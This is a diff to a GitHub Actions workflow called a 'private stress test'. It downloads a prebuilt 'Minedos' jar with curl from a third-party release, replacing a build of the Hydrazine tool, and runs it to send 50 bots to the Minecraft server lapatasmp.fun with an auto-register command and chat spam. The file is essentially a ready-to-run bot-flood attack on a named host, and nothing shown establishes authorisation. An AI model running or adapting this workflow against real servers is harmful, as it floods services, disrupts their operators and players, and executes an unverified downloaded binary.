@@ -2,25 +2,22 @@ name: My Private Stress Test
 on: workflow_dispatch
 
 jobs:
-  build-and-run:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup Java
+      - name: Setup Java 17
         uses: actions/setup-java@v4
         with:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Clone and Build Tool
+      - name: Download Bot Tool
         run: |
-          git clone https://github.com/KofS-Team/Hydrazine.git
-          cd Hydrazine
-          chmod +x gradlew
-          ./gradlew shadowJar
+          # Downloading a clean, working bot engine
+          curl -L -o minedos.jar https://github.com/Annihilation786/Minedos-CLI/releases/download/1.2.1/Minedos.jar
 
       - name: Launch My Bots
         run: |
-          # Finding the built jar and running it
-          JAR_PATH=$(find Hydrazine/build/libs -name "*.jar" | head -n 1)
-          # This joins 50 bots and sends your register command
-          java -jar $JAR_PATH lapatasmp.fun 25565 50 1.20.1 -login "/register 1234555 1234555" -chat "Testing PakSMP!"
+          # Running the bots on lapatasmp.fun
+          # -reg: handles the registration, -msg: sends the chat message
+          java -jar minedos.jar -ip lapatasmp.fun -port 25565 -version 1.20.1 -amount 50 -reg "/register 1234555 1234555" -msg "Testing PakSMP Protection!"
